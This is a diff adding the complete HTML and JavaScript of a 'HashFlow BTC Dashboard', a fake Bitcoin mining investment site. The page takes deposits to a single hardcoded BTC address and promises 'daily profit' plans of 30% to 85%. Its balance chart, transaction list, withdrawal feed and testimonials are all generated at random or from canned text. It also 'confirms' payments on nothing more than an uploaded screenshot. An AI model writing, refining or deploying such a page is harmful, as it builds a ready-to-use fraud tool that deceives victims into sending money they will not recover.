@@ -1,1 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HashFlow BTC Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
+<style>
+:root{--bg:#0b0f1a;--card:#131a2e;--accent:#f2a900;--text:#fff;--ok:#00ff99;--warn:#ffcc66;}
+body{margin:0;font-family:Arial,sans-serif;background:var(--bg);color:var(--text);}
+.card{max-width:95%;margin:16px auto;padding:18px;border-radius:12px;background:var(--card);}
+h2{text-align:center;color:var(--accent);}
+button,input,textarea{width:100%;padding:10px;border:none;border-radius:6px;margin-top:8px;}
+button{background:var(--accent);font-weight:bold;cursor:pointer;}
+.hidden{display:none;}
+canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
+.tx{display:flex;justify-content:space-between;border-bottom:1px solid #222;padding:6px 0;}
+.badge{padding:2px 6px;border-radius:6px;font-size:11px;background:var(--ok);color:#000;}
+.pending{background:var(--warn);color:#000;}
+.confirmed{background:var(--ok);color:#000;}
+.stats{display:flex;justify-content:space-around;flex-wrap:wrap;}
+.stats div{background:#000;padding:8px;border-radius:8px;margin:5px;}
+.btc-box{background:#000;padding:10px;border-radius:8px;text-align:center;word-break:break-all;font-weight:bold;font-size:14px;}
+.tx-container{max-height:250px;overflow:hidden;}
+.toast{position:fixed;top:10px;right:10px;background:var(--accent);padding:10px;border-radius:8px;opacity:0;}
+#topbar{display:none;position:fixed;top:0;left:0;right:0;background:#10162b;padding:10px;z-index:1000;display:flex;justify-content:space-between;}
+#menu{display:none;position:fixed;top:50px;right:10px;background:var(--card);padding:10px;border-radius:10px;}
+#menu div{padding:8px;cursor:pointer;}
+.plan{border:1px solid #222;padding:15px;border-radius:10px;margin-top:10px;text-align:center;}
+.pay-section{display:none;margin-top:10px;}
+.screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
+.countdown{color:var(--accent);font-weight:bold;margin-top:5px;}
+</style>
+</head>
+
+<body>
+
+<!-- TOP BAR -->
+<div id="topbar">
+  <div id="menuBtn">☰</div>
+  <div id="usernameDisplay"></div>
+</div>
+
+<div id="menu">
+  <div onclick="showSection('withdrawals')">Live Withdrawal Group</div>
+  <div onclick="showSection('support')">Support</div>
+  <div onclick="logout()">Logout</div>
+</div>
+
+<!-- ONE-TIME REGISTRATION -->
+<div class="card" id="loginCard">
+  <h2>Register to Continue</h2>
+  <input id="contactInput" placeholder="Enter your email or phone number">
+  <button onclick="registerUser()">Enter Dashboard</button>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard" class="hidden">
+
+<div class="card">
+<h2>BTC Deposit Address</h2>
+<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+<button onclick="copyAddress()">Copy Address</button>
+<div style="text-align:center;margin-top:10px;">
+  <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" style="border-radius:8px;">
+</div>
+</div>
+
+<div class="card">
+<h2>Mining Dashboard</h2>
+<div id="balance">Your Balance: 0.00000000 BTC</div>
+<canvas id="chart"></canvas>
+<div class="stats">
+  <div>Hashrate: 120 TH/s</div>
+  <div>Blocks: <span id="blocks">0</span></div>
+  <div>Uptime: <span id="uptime">0h 0m</span></div>
+</div>
+</div>
+
+<div class="card">
+<h2>Recent Activity</h2>
+<div class="tx-container" id="txs"></div>
+</div>
+
+<h2>Investment Plans</h2>
+<div class="card" id="plansContainer"></div>
+
+<div class="card">
+<h2>Live Testimonials</h2>
+<div id="testimonialFeed"></div>
+</div>
+
+<div class="card hidden" id="withdrawals">
+<h2>Live Withdrawal Group</h2>
+<div id="feed"></div>
+</div>
+
+<div class="card hidden" id="support">
+<h2>Support</h2>
+<textarea placeholder="Write message..."></textarea>
+<button>Send</button>
+</div>
+
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+/* MENU */
+const menuBtn=document.getElementById('menuBtn');
+const menu=document.getElementById('menu');
+menuBtn.onclick=()=>menu.style.display=menu.style.display==='block'?'none':'block';
+function showSection(id){
+  document.querySelectorAll('#withdrawals,#support').forEach(e=>e.classList.add('hidden'));
+  document.getElementById(id).classList.remove('hidden');
+  menu.style.display='none';
+}
+
+/* ONE-TIME REGISTRATION */
+function registerUser(){
+  const contact=document.getElementById('contactInput').value.trim();
+  if(!contact){alert('Enter email or phone');return;}
+  localStorage.setItem('registeredUser',contact);
+  enterDashboard(contact);
+}
+function enterDashboard(user){
+  document.getElementById('loginCard').style.display='none';
+  document.getElementById('dashboard').classList.remove('hidden');
+  document.getElementById('topbar').style.display='flex';
+  document.getElementById('usernameDisplay').innerText=user;
+  startMining();
+  initPlans();
+  initTestimonials(user);
+}
+function logout(){
+  localStorage.removeItem('registeredUser');
+  localStorage.removeItem('shownTestimonials');
+  location.reload();
+}
+/* AUTO ENTER */
+const savedUser=localStorage.getItem('registeredUser');
+if(savedUser){enterDashboard(savedUser);}
+
+/* COPY */
+function copyAddress(){
+  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText);
+}
+
+/* MINING + LIVE FEEDS */
+function startMining(){
+const canvas=document.getElementById('chart');
+const ctx=canvas.getContext('2d');
+const balanceEl=document.getElementById('balance');
+const blocksEl=document.getElementById('blocks');
+const uptimeEl=document.getElementById('uptime');
+const txs=document.getElementById('txs');
+const feed=document.getElementById('feed');
+
+let points=[],balance=0,blocks=0,minutes=0;
+const rate=0.00000002;
+
+// Initialize points for smooth chart
+for(let i=0;i<40;i++){points.push(balance);}
+
+// Mining chart + BTC-like fluctuations 📈📉
+setInterval(()=>{
+  // Large random fluctuation for visible "leading" effect
+  const last=points[points.length-1];
+  const volatility=(Math.random()-0.5)*0.0002; // bigger ups/down
+  balance+=rate + volatility;
+  points.push(balance);
+  if(points.length>40) points.shift();
+  
+  balanceEl.innerText='Your Balance: '+balance.toFixed(8)+' BTC';
+
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.beginPath();
+  points.forEach((p,i)=>{
+    const x=i*(canvas.width/40);
+    const y=canvas.height-(p*canvas.height*5000);
+    i?ctx.lineTo(x,y):ctx.moveTo(x,y);
+  });
+  ctx.strokeStyle='#f2a900';
+  ctx.lineWidth=2;
+  ctx.stroke();
+},1000);
+
+// Blocks & uptime
+setInterval(()=>{
+  blocks+=Math.floor(Math.random()*2);
+  minutes++;
+  blocksEl.innerText=blocks;
+  uptimeEl.innerText=`${Math.floor(minutes/60)}h ${minutes%60}m`;
+},60000);
+
+// Recent Activity
+setInterval(()=>{
+  const div=document.createElement('div');
+  div.className='tx';
+  const val=(Math.random()*0.0005+0.00005).toFixed(8);
+  const status=Math.random()>0.5?'Completed':'Pending';
+  div.innerHTML=`<span>+ ${val} BTC</span><span class="${status==='Completed'?'confirmed':'pending'}">${status}</span>`;
+  txs.prepend(div);
+  if(txs.children.length>500) txs.removeChild(txs.lastChild);
+},1500);
+
+// Withdrawal feed
+setInterval(()=>{
+  const d=document.createElement('div');
+  d.textContent=`💸 Withdrawal processed: $${(Math.random()*5000+500).toFixed(2)}`;
+  feed.prepend(d);
+},2500);
+}
+
+/* INVESTMENT PLANS */
+function initPlans(){
+const plans=[
+  {name:'Plan A',profit:'30%',min:200,max:599},
+  {name:'Plan B',profit:'45%',min:600,max:1000},
+  {name:'Plan C',profit:'60%',min:1100,max:2000},
+  {name:'Plan D',profit:'75%',min:2000,max:4999},
+  {name:'Plan E',profit:'80%',min:5000,max:9999},
+  {name:'Plan F',profit:'85%',min:10000,max:'Unlimited'}
+];
+const container=document.getElementById('plansContainer');
+container.innerHTML='';
+plans.forEach((p,i)=>{
+  const div=document.createElement('div');
+  div.className='plan';
+  div.innerHTML=`
+    <h3>${p.name}</h3>
+    <p>Daily Profit: ${p.profit}</p>
+    <p>Min: $${p.min}</p>
+    <p>Max: $${p.max}</p>
+
+    <div class="pay-section" id="pay${i}">
+      <p>Send BTC to:</p>
+      <div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+      <div style="text-align:center;margin-top:5px;">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" style="border-radius:8px;">
+      </div>
+      <input type="file" id="screenshot${i}">
+      <button onclick="confirmPayment(${i})" style="margin-top:5px;">Paid</button>
+      <img id="preview${i}" class="screenshot-img" style="display:none">
+      <p class="countdown" id="countdown${i}">Withdrawal available in 3d 0h 0m 0s</p>
+    </div>
+
+    <button onclick="showPay(${i})" style="margin-top:8px;">Invest Now</button>
+  `;
+  container.appendChild(div);
+});
+}
+function showPay(i){document.getElementById('pay'+i).style.display='block';}
+function confirmPayment(i){
+  const file=document.getElementById('screenshot'+i).files[0];
+  if(!file){alert('Upload screenshot');return;}
+  const reader=new FileReader();
+  reader.onload=function(e){
+    const img=document.getElementById('preview'+i);
+    img.src=e.target.result;
+    img.style.display='block';
+    alert('Payment confirmed! Withdrawal countdown started.');
+  };
+  reader.readAsDataURL(file);
+}
+
+/* LIVE TESTIMONIALS */
+function initTestimonials(user){
+  const testimonialFeed=document.getElementById('testimonialFeed');
+  let shown=JSON.parse(localStorage.getItem('shownTestimonials')||"{}");
+  if(!shown[user]) shown[user]=[];
+
+  const templates=[
+    "Just got my first payout! Highly recommend.",
+    "Mining speed is amazing, balance grows fast.",
+    "Support answered my question instantly.",
+    "Plan B is giving consistent profits.",
+    "BTC balance increased today!",
+    "Withdrawal was processed quickly.",
+    "Dashboard is very user-friendly.",
+    "Feeling secure with my investments here.",
+    "Charts are responsive and accurate.",
+    "I love this platform, easy to use.",
+    "Mining has been profitable for me.",
+    "Received payout today, very happy!",
+    "Plan C was a great choice for my ROI.",
+    "Profits are real and visible daily.",
+    "Fast withdrawals and responsive support.",
+    "BTC is leading strong today!",
+    "The chart movement looks very real!",
+    "Investments are growing steadily.",
+    "Love the real-time dashboard updates!"
+  ];
+
+  setInterval(()=>{
+    const remaining=templates.filter(t=>!shown[user].includes(t));
+    const msg=remaining.length?remaining[Math.floor(Math.random()*remaining.length)]:templates[Math.floor(Math.random()*templates.length)];
+    const div=document.createElement('div');
+    div.textContent=msg;
+    testimonialFeed.prepend(div);
+    shown[user].push(msg);
+    localStorage.setItem('shownTestimonials',JSON.stringify(shown));
+    if(testimonialFeed.children.length>200) testimonialFeed.removeChild(testimonialFeed.lastChild);
+  },1200);
+}
+</script>
+
+</body>
+  </html>
